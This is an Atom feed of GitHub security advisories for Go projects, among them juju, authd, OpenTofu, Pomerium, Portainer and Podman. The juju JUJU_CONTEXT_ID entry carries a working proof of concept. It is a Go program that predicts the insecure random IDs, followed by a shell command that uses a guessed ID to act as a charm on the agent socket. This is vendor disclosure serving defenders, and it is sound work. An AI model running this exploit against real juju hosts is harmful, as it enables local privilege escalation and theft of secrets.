<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-10-05T20:01:31.109Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/juju/juju] Vulnerable juju introspection abstract UNIX domain socket]]></title>
        <id>https://github.com/advisories/GHSA-xwgj-vpm9-q2rq</id>
        <link href="https://github.com/advisories/GHSA-xwgj-vpm9-q2rq"/>
        <updated>2024-10-03T16:53:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An abstract UNIX domain socket responsible for introspection is available without authentication locally to any user with access to the network namespace where the local juju agent is running.</p>
<p>On a juju controller agent, denial of service can be performed by using the <code>/leases/revoke</code> endpoint. Revoking leases in juju can cause availability issues.</p>
<p>On a juju machine agent that is hosting units, disabling the unit component can be performed using the <code>/units</code> endpoint with a "stop" action.</p>
<h3 id="patches">Patches</h3>
<p>Patch: <a href="https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b">https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b</a>
Patched in:</p>
<ul>
<li>3.5.4</li>
<li>3.4.6</li>
<li>3.3.7</li>
<li>3.1.10</li>
<li>2.9.51</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/juju/juju/security/advisories/GHSA-xwgj-vpm9-q2rq">https://github.com/juju/juju/security/advisories/GHSA-xwgj-vpm9-q2rq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8038">https://nvd.nist.gov/vuln/detail/CVE-2024-8038</a></li>
<li><a href="https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b">https://github.com/juju/juju/commit/43f0fc59790d220a457d4d305f484f62be556d3b</a></li>
<li><a href="https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/introspection/worker.go#L125</a></li>
<li><a href="https://github.com/advisories/GHSA-xwgj-vpm9-q2rq">https://github.com/advisories/GHSA-xwgj-vpm9-q2rq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xwgj-vpm9-q2rq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T16:53:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/juju/juju] Vulnerable juju hook tool abstract UNIX domain socket]]></title>
        <id>https://github.com/advisories/GHSA-8v4w-f4r9-7h6x</id>
        <link href="https://github.com/advisories/GHSA-8v4w-f4r9-7h6x"/>
        <updated>2024-10-03T16:53:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When combined with an attack of <code>JUJU_CONTEXT_ID</code>, any user on the local system with access to the default network namespace may connect to the <code>@/var/lib/juju/agents/unit-xxxx-yyyy/agent.socket</code> and perform actions that are normally reserved to a juju charm.</p>
<h3 id="patches">Patches</h3>
<p>Patch: <a href="https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206">https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206</a>
Patched in:</p>
<ul>
<li>3.5.4</li>
<li>3.4.6</li>
<li>3.3.7</li>
<li>3.1.10</li>
<li>2.9.51</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workarounds available.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4">GHSA-mh98-763h-m9v4</a>
<a href="https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/juju/juju/security/advisories/GHSA-8v4w-f4r9-7h6x">https://github.com/juju/juju/security/advisories/GHSA-8v4w-f4r9-7h6x</a></li>
<li><a href="https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4">https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8037">https://nvd.nist.gov/vuln/detail/CVE-2024-8037</a></li>
<li><a href="https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206">https://github.com/juju/juju/commit/2f2ec128ef5a8ca81fc86ae79cfcdbab0007c206</a></li>
<li><a href="https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222">https://github.com/juju/juju/blob/725800953aaa29dbeda4f806097bf838e61644dd/worker/uniter/paths.go#L222</a></li>
<li><a href="https://github.com/advisories/GHSA-8v4w-f4r9-7h6x">https://github.com/advisories/GHSA-8v4w-f4r9-7h6x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8v4w-f4r9-7h6x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T16:53:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/ubuntu/authd] PAM module may allow accessing with the credentials of another user]]></title>
        <id>https://github.com/advisories/GHSA-x5q3-c8rm-w787</id>
        <link href="https://github.com/advisories/GHSA-x5q3-c8rm-w787"/>
        <updated>2024-10-03T16:53:11.000Z</updated>
        <content type="html"><![CDATA[<p>Authd PAM module up to version 0.3.4 can allow broker-managed users to impersonate any other user managed by the same broker and perform any PAM operation with it, including authenticating as them.</p>
<p>This is possible using tools such as <code>su</code>, <code>sudo</code> or <code>ssh</code> (and potentially others) that, so far, do not ensure that the PAM user at the end of the transaction is matching the one who initiated the transaction.</p>
<p>Authd 0.3.5 fixes this by not allowing changing the user unless it was never set before in the PAM stack.</p>
<p><code>su</code> version that will include <a href="https://github.com/util-linux/util-linux/pull/3206">https://github.com/util-linux/util-linux/pull/3206</a> will not be affected
<code>ssh</code> version that will include <a href="https://github.com/openssh/openssh-portable/pull/521">https://github.com/openssh/openssh-portable/pull/521</a> will not be affected
<code>sudo</code> version that will include <a href="https://github.com/sudo-project/sudo/pull/412">https://github.com/sudo-project/sudo/pull/412</a> will not be affected
<code>login</code> not affected
<code>passwd</code> not affected</p>
<details>
<summary>Old report</summary>

<h3 id="summary">Summary</h3>
<p>An user can access as another user using its own credentials</p>
<h3 id="details">Details</h3>
<p>I feel we’ve a security issue that is due to the fact that we allow changing the user in the cases in which that’s already provided by PAM, I’ve not tested this using the entra-id broker but it’s reproducible with the example one, but unless I’m missing something it should be independent from the broker in use.</p>
<p>Basically, by going to the user selection page we allow to login as any user by entering the use own credentials.</p>
<p>See for example: <a href="https://asciinema.org/a/VIcjpDImomaGu0wxsJJxNdmlf">https://asciinema.org/a/VIcjpDImomaGu0wxsJJxNdmlf</a> or <a href="https://asciinema.org/a/CV3D1gaEhn2yclqSMKCnifYPo">https://asciinema.org/a/CV3D1gaEhn2yclqSMKCnifYPo</a>  </p>
<p>Basically it’s possible to logging in as <code>user1</code> using the credentials of <code>user2</code> or <code>user3</code>.</p>
<p>The issue doesn’t affect login or passwd, but it does affect <code>su</code> and <code>sshd</code>, since in both cases they don’t check if the <code>PAM_USER</code> changed before the final authentication.</p>
<p>Now, while those tools should likely be fixed to only read the PAM_USER once pam gave them the final ok, I think authd should not allow changing the user at all when it has been provided by PAM.</p>
</details>
### References

<ul>
<li><a href="https://github.com/ubuntu/authd/security/advisories/GHSA-x5q3-c8rm-w787">https://github.com/ubuntu/authd/security/advisories/GHSA-x5q3-c8rm-w787</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9313">https://nvd.nist.gov/vuln/detail/CVE-2024-9313</a></li>
<li><a href="https://github.com/ubuntu/authd/commit/63e527496b013bed46904c1c58be593c13ebdce5">https://github.com/ubuntu/authd/commit/63e527496b013bed46904c1c58be593c13ebdce5</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2024-9313">https://www.cve.org/CVERecord?id=CVE-2024-9313</a></li>
<li><a href="https://github.com/advisories/GHSA-x5q3-c8rm-w787">https://github.com/advisories/GHSA-x5q3-c8rm-w787</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x5q3-c8rm-w787</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-03T16:53:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/opentofu/opentofu] OpenTofu potential leaking of secret variable values when using static evaluation in v1.8]]></title>
        <id>https://github.com/advisories/GHSA-wpr2-j6gr-pjw9</id>
        <link href="https://github.com/advisories/GHSA-wpr2-j6gr-pjw9"/>
        <updated>2024-10-03T16:51:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Users who have opted into static evaluation of module sources, versions, and backend configurations may be at risk of exposing sensitive variables and locals.  This is a workflow that should not be possible and explicitly show errors.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Check that you are not using sensitive variables in module sources and versions, as well as backend configurations.  The patch will add explicit errors and prevent this from being possible.</p>
<h3 id="examples">Examples</h3>
<pre><code class="language-hcl">variable "backend_path" {
        type = string
        sensitive = true
}

terraform {
        backend "local" {
                path = var.backend_path
        }
}
</code></pre>
<pre><code class="language-hcl">variable "mod_info" {
        type = string
        sensitive = true
}

module "foo" {
        source = var.mod_info
        //version = var.mod_info
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/opentofu/opentofu/security/advisories/GHSA-wpr2-j6gr-pjw9">https://github.com/opentofu/opentofu/security/advisories/GHSA-wpr2-j6gr-pjw9</a></li>
<li><a href="https://github.com/advisories/GHSA-wpr2-j6gr-pjw9">https://github.com/advisories/GHSA-wpr2-j6gr-pjw9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpr2-j6gr-pjw9</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-03T16:51:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/juju/juju] JUJU_CONTEXT_ID is a predictable authentication secret]]></title>
        <id>https://github.com/advisories/GHSA-mh98-763h-m9v4</id>
        <link href="https://github.com/advisories/GHSA-mh98-763h-m9v4"/>
        <updated>2024-10-03T16:50:00.000Z</updated>
        <content type="html"><![CDATA[<p><code>JUJU_CONTEXT_ID</code> is the authentication measure on the unit hook tool abstract domain socket. It looks like <code>JUJU_CONTEXT_ID=appname/0-update-status-6073989428498739633</code>.</p>
<p>This value looks fairly unpredictable, but due to the random source used, it is highly predictable.</p>
<p><code>JUJU_CONTEXT_ID</code> has the following components:</p>
<ul>
<li>the application name</li>
<li>the unit number</li>
<li>the hook being currently run</li>
<li>a uint63 decimal number</li>
</ul>
<p>On a system the application name and unit number can be deduced by reading the structure of the filesystem.
The current hook being run is not easily deduce-able, but is a limited set of possible values, so one could try them all.
Finally the random number, this is generated from a non cryptographically secure random source. Specifically the random number generator built into the go standard library, using the current unix time in seconds (at startup) as the seed.</p>
<p>There is no rate limiting on the abstract domain socket, the only limiting factor is time (window of time the hook is run) and memory (how much memory is available to facilitate all the connections).</p>
<h3 id="impact">Impact</h3>
<p>On a juju machine (non-kubernetes) or juju charm container (on kubernetes), an unprivileged user in the same network namespace can connect to an abstract domain socket and guess the JUJU_CONTEXT_ID value. This gives the unprivileged user access to the same information and tools as the juju charm. This information could be secrets that give broader access.</p>
<h3 id="patches">Patches</h3>
<p>Patch: <a href="https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7">https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7</a>
Patched in:</p>
<ul>
<li>3.5.4</li>
<li>3.4.6</li>
<li>3.3.7</li>
<li>3.1.10</li>
<li>2.9.51</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>No workaround. Upgrade will be required.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L152">https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L152</a>
<a href="https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L164">https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L164</a></p>
<h3 id="poc">PoC</h3>
<p>With a contrived example, a charm that sleeps indefinitely on its first hook, install. This charm is called sleepy.</p>
<pre><code>.
|-- hooks
|   `-- install
#!/bin/sh
sleep 10000
|-- manifest.yaml
bases:
  - name: ubuntu
    channel: 22.04/stable
    architectures:
      - amd64
|-- metadata.yaml
name: sleepy
summary: a sleepy charm
description: a sleepy charm that sleeps on install
`-- revision
1
</code></pre>
<p>With sleepy deployed into a model, we have a unit with the name <code>sleepy/0</code> and an tag of <code>unit-sleepy-0</code>.</p>
<p>With access to the log file we can very quickly get the start time of the unit:</p>
<pre><code>ubuntu@juju-5e40c0-0:~$ cat /var/log/juju/unit-sleepy-0.log | grep 'unit "sleepy/0" started'
2024-08-06 05:10:07 INFO juju.worker.uniter uniter.go:363 unit "sleepy/0" started
</code></pre>
<p>If we don't have access to the log, we could get pretty close by trying every second between when log file was created and now:</p>
<pre><code>nobody@juju-5e40c0-0:/var/log/juju$ cat unit-sleepy-0.log
cat: unit-sleepy-0.log: Permission denied
nobody@juju-5e40c0-0:/var/log/juju$ stat unit-sleepy-0.log
  File: unit-sleepy-0.log
  Size: 1403      	Blocks: 8          IO Block: 4096   regular file
Device: 10302h/66306d	Inode: 25967076    Links: 1
Access: (0640/-rw-r-----)  Uid: (  104/  syslog)   Gid: (    4/     adm)
Access: 2024-08-06 05:10:48.686975042 +0000
Modify: 2024-08-06 05:10:07.159133215 +0000
Change: 2024-08-06 05:10:07.159133215 +0000
 Birth: 2024-08-06 05:10:06.965129276 +0000
</code></pre>
<p>We can then pass that into this program:</p>
<pre><code>package main

import (
    "flag"
    "fmt"
    "math/rand"
    "time"
)

func main() {
    var unitName string
    var unitStartLogTime string
    var currentHook string
    flag.StringVar(&amp;unitName, "u", "sleepy/0", "")
    flag.StringVar(&amp;unitStartLogTime, "t", "2024-08-06 05:10:07", "time when the last 'INFO juju.worker.uniter uniter.go:363 unit %q started' log was written to /var/log/juju/unit-name-0.log")
    flag.StringVar(&amp;currentHook, "h", "install", "the current hook that is running right now")
    flag.Parse()

    t, err := time.Parse("2006-01-02 15:04:05", unitStartLogTime)
    if err != nil {
        panic(err)
    }

    sources := []rand.Source{
        rand.NewSource(t.Unix()),
        rand.NewSource(t.Unix() - 1),
        rand.NewSource(t.Unix() - 2),
    }

    for i := 0; i &lt; 10; i++ {
        for _, source := range sources {
            fmt.Printf("%s-%s-%d\n", unitName, currentHook, source.Int63())
        }
    }
}
</code></pre>
<p>This program will give us a list of <code>JUJU_CONTEXT_ID</code>s to try. We just need to try each one. In this case it was the first one, because we had enough information.</p>
<pre><code>$ go run . -u sleepy/0 -t "2024-08-06 05:10:07" -h install
sleepy/0-install-7349430268617352851
sleepy/0-install-2171542415131519293
sleepy/0-install-6564961386023494624
sleepy/0-install-59904244413115609
sleepy/0-install-6073989428498739633
sleepy/0-install-2504995199508561544
sleepy/0-install-1526670560532335303
sleepy/0-install-2568216045630615950
sleepy/0-install-8047402353801897930
</code></pre>
<p>Unfortunately, this worked too well.</p>
<pre><code>nobody@juju-5e40c0-0:/var/log/juju$ JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-sleepy-0/agent.socket JUJU_CONTEXT_ID=sleepy/0-install-7349430268617352851 /var/lib/juju/tools/unit-sleepy-0/is-leader
True
</code></pre>
<p>With a more sophisticated attack, this could discover all the units on the machine, using the update-status hook, try a few thousand attempts per second to guess the start time and the current offset in the random source, then using secret-get hook tool, get some sort of secret, such as credentials to a system.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4">https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7558">https://nvd.nist.gov/vuln/detail/CVE-2024-7558</a></li>
<li><a href="https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7">https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7</a></li>
<li><a href="https://github.com/advisories/GHSA-mh98-763h-m9v4">https://github.com/advisories/GHSA-mh98-763h-m9v4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mh98-763h-m9v4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-03T16:49:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/juju/juju] Duplicate Advisory: Juju Unprotected Alternate Channel vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-85qf-6845-m8p2</id>
        <link href="https://github.com/advisories/GHSA-85qf-6845-m8p2"/>
        <updated>2024-10-02T21:55:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-xwgj-vpm9-q2rq. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>Vulnerable juju introspection abstract UNIX domain socket. An abstract UNIX domain socket responsible for introspection is available without authentication locally to network namespace users. This enables denial of service attacks.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juju/juju/security/advisories/GHSA-xwgj-vpm9-q2rq">https://github.com/juju/juju/security/advisories/GHSA-xwgj-vpm9-q2rq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8038">https://nvd.nist.gov/vuln/detail/CVE-2024-8038</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2024-8038">https://www.cve.org/CVERecord?id=CVE-2024-8038</a></li>
<li><a href="https://github.com/advisories/GHSA-85qf-6845-m8p2">https://github.com/advisories/GHSA-85qf-6845-m8p2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-85qf-6845-m8p2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-02T12:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/juju/juju] Duplicate Advisory: Vulnerable juju hook tool abstract UNIX domain socket]]></title>
        <id>https://github.com/advisories/GHSA-fc27-7pf5-96v3</id>
        <link href="https://github.com/advisories/GHSA-fc27-7pf5-96v3"/>
        <updated>2024-10-02T21:55:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-8v4w-f4r9-7h6x. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>Vulnerable juju hook tool abstract UNIX domain socket. When combined with an attack of JUJU_CONTEXT_ID, any user on the local system with access to the default network namespace may connect to the @/var/lib/juju/agents/unit-xxxx-yyyy/agent.socket and perform actions that are normally reserved to a juju charm.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juju/juju/security/advisories/GHSA-8v4w-f4r9-7h6x">https://github.com/juju/juju/security/advisories/GHSA-8v4w-f4r9-7h6x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8037">https://nvd.nist.gov/vuln/detail/CVE-2024-8037</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2024-8037">https://www.cve.org/CVERecord?id=CVE-2024-8037</a></li>
<li><a href="https://github.com/advisories/GHSA-fc27-7pf5-96v3">https://github.com/advisories/GHSA-fc27-7pf5-96v3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fc27-7pf5-96v3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-02T12:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/juju/juju] Duplicate Advisory: Juju makes Use of Weak Credentials]]></title>
        <id>https://github.com/advisories/GHSA-phh4-3hmm-24rx</id>
        <link href="https://github.com/advisories/GHSA-phh4-3hmm-24rx"/>
        <updated>2024-10-02T21:55:44.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-mh98-763h-m9v4. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>JUJU_CONTEXT_ID is a predictable authentication secret. On a Juju machine (non-Kubernetes) or Juju charm container (on Kubernetes), an unprivileged user in the same network namespace can connect to an abstract domain socket and guess the JUJU_CONTEXT_ID value. This gives the unprivileged user access to the same information and tools as the Juju charm.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4">https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7558">https://nvd.nist.gov/vuln/detail/CVE-2024-7558</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2024-7558">https://www.cve.org/CVERecord?id=CVE-2024-7558</a></li>
<li><a href="https://github.com/advisories/GHSA-phh4-3hmm-24rx">https://github.com/advisories/GHSA-phh4-3hmm-24rx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-phh4-3hmm-24rx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-02T12:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/pomerium/pomerium] Pomerium service account access token may grant unintended access to databroker API]]></title>
        <id>https://github.com/advisories/GHSA-r7rh-jww5-5fjr</id>
        <link href="https://github.com/advisories/GHSA-r7rh-jww5-5fjr"/>
        <updated>2024-10-03T13:26:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>We've identified a vulnerability in the Pomerium databroker service API that may grant unintended access under specific conditions. This affects only certain Pomerium Zero and Pomerium Enterprise deployments.</p>
<h4 id="who-is-affected">Who is affected?</h4>
<p>A Pomerium deployment is susceptible to this issue if <em>all</em> of the following conditions are met:</p>
<ul>
<li>You have issued a <a href="https://www.pomerium.com/docs/capabilities/service-accounts">service account</a> access token using Pomerium Zero or Pomerium Enterprise.</li>
<li>The access token has an explicit expiration date in the future.</li>
<li>The core Pomerium databroker gRPC API is not otherwise secured by network access controls.</li>
</ul>
<p>If your deployment does not meet <em>all</em> of these conditions, you are not affected by this vulnerability.</p>
<h4 id="details">Details</h4>
<p>The Pomerium databroker service is responsible for managing all persistent Pomerium application state. Requests to the databroker service API are authorized by the presence of a JSON Web Token (JWT) signed by a key known by all Pomerium services in the same deployment. However, incomplete validation of this JWT meant that some service account access tokens would incorrectly be treated as valid for the purpose of databroker API authorization.</p>
<p>Improper access to the databroker API could allow exfiltration of user info, spoofing of user sessions, or tampering with Pomerium routes, policies, and other settings.</p>
<h4 id="discovery">Discovery</h4>
<p>This issue was discovered during internal review. At this time we have no evidence to suggest that this vulnerability has been exploited in the wild.</p>
<h3 id="patches">Patches</h3>
<p>We have released <a href="https://github.com/pomerium/pomerium/releases/tag/v0.27.1">Pomerium v0.27.1</a> which includes a fix for the JWT validation logic. All affected users are strongly encouraged to upgrade to this version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade immediately, consider the following mitigations:</p>
<ul>
<li><p>Network access controls: Restrict access to the Pomerium internal gRPC API by configuring your network firewall or security groups to limit access to trusted sources only. Ensure that the port specified in the <a href="https://www.pomerium.com/docs/reference/grpc#grpc-address"><code>grpc_address</code></a> setting is not exposed to unauthorized networks.</p>
</li>
<li><p><em>For Pomerium Zero deployments only:</em> As of Pomerium v0.26.0, you can disable the gRPC API listener by setting <code>grpc_address: ""</code> in your YAML configuration file. In all-in-one mode, Pomerium does not require the internal gRPC API to be exposed beyond localhost.</p>
</li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have questions or need further assistance:</p>
<ul>
<li>Open an issue in the <a href="https://github.com/pomerium/pomerium/issues">pomerium/pomerium</a> repository.</li>
<li>Contact us at <a href="mailto:security@pomerium.com">security@pomerium.com</a>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pomerium/pomerium/security/advisories/GHSA-r7rh-jww5-5fjr">https://github.com/pomerium/pomerium/security/advisories/GHSA-r7rh-jww5-5fjr</a></li>
<li><a href="https://github.com/pomerium/pomerium/commit/e018cf0fc0979d2abe25ff705db019feb7523444">https://github.com/pomerium/pomerium/commit/e018cf0fc0979d2abe25ff705db019feb7523444</a></li>
<li><a href="https://github.com/pomerium/pomerium/releases/tag/v0.27.1">https://github.com/pomerium/pomerium/releases/tag/v0.27.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47616">https://nvd.nist.gov/vuln/detail/CVE-2024-47616</a></li>
<li><a href="https://github.com/advisories/GHSA-r7rh-jww5-5fjr">https://github.com/advisories/GHSA-r7rh-jww5-5fjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r7rh-jww5-5fjr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-02T21:33:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/portainer/portainer] Portainer improperly uses an encryption algorithm in the AesEncrypt function]]></title>
        <id>https://github.com/advisories/GHSA-9mjw-79r6-c9m8</id>
        <link href="https://github.com/advisories/GHSA-9mjw-79r6-c9m8"/>
        <updated>2024-10-02T17:58:15.000Z</updated>
        <content type="html"><![CDATA[<p>Portainer before 2.20.2 improperly uses an encryption algorithm in the <code>AesEncrypt</code> function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-33662">https://nvd.nist.gov/vuln/detail/CVE-2024-33662</a></li>
<li><a href="https://github.com/portainer/portainer/issues/11737">https://github.com/portainer/portainer/issues/11737</a></li>
<li><a href="https://github.com/portainer/portainer/compare/2.20.1...2.20.2">https://github.com/portainer/portainer/compare/2.20.1...2.20.2</a></li>
<li><a href="https://www.portainer.io">https://www.portainer.io</a></li>
<li><a href="https://github.com/search?q=repo%3Aportainer%2Fportainer+EE-6764&amp;type=pullrequests">https://github.com/search?q=repo%3Aportainer%2Fportainer+EE-6764&amp;type=pullrequests</a></li>
<li><a href="https://github.com/advisories/GHSA-9mjw-79r6-c9m8">https://github.com/advisories/GHSA-9mjw-79r6-c9m8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9mjw-79r6-c9m8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-02T06:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/podman/v5] Improper Input Validation in Buildah and Podman]]></title>
        <id>https://github.com/advisories/GHSA-fhqq-8f65-5xfc</id>
        <link href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc"/>
        <updated>2024-10-01T22:32:08.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability exists in the bind-propagation option of the Dockerfile RUN --mount instruction. The system does not properly validate the input passed to this option, allowing users to pass arbitrary parameters to the mount instruction. This issue can be exploited to mount sensitive directories from the host into a container during the build process and, in some cases, modify the contents of those mounted files. Even if SELinux is used, this vulnerability can bypass its protection by allowing the source directory to be relabeled to give the container access to host files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9407">https://nvd.nist.gov/vuln/detail/CVE-2024-9407</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-9407">https://access.redhat.com/security/cve/CVE-2024-9407</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2315887">https://bugzilla.redhat.com/show_bug.cgi?id=2315887</a></li>
<li><a href="https://github.com/advisories/GHSA-fhqq-8f65-5xfc">https://github.com/advisories/GHSA-fhqq-8f65-5xfc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
